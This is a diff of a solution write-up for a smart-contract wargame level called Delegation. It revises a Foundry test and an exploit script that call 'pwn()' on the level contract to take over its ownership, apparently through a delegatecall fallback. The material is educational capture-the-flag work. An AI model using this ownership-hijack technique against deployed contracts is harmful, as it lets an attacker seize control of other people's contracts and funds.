@@ -188,13 +188,7 @@ contract DelegationTest is Test {
 
     Delegate public delegate = new Delegate(makeAddr("owner"));
     Delegation public level = new Delegation(address(delegate));
-
-    address instance = vm.addr(0x10053); 
     address hacker = vm.addr(0x1337); 
-
-    function setUp() public {
-        vm.prank(instance);
-    }
 
     function testDelegationHack() public {
 
@@ -204,6 +198,7 @@ contract DelegationTest is Test {
         (bool success, ) = address(level).call(
             abi.encodeWithSignature("pwn()")
         );
+
         assertTrue(success);
         assertEq(level.owner(), hacker);
 
@@ -234,18 +229,17 @@ contract DelegationTest is Test {
 ```solidity
 contract Exploit is Script {
 
-        Delegation level = Delegation(instance);   
-        address instance = vm.envAddress("INSTANCE_LEVEL6"); 
-        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+    address instance = vm.envAddress("INSTANCE_LEVEL6"); 
+    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+    Delegation level = Delegation(instance); 
         
-        function run() external {
-
-            vm.startBroadcast(hacker);
-            (bool success, ) = address(level).call(
-                abi.encodeWithSignature("pwn()")
-            );
-            require(success);
-            vm.stopBroadcast();
+    function run() external {
+        vm.startBroadcast(hacker);
+        (bool success, ) = address(level).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success);
+        vm.stopBroadcast();
     }
 }
 ```
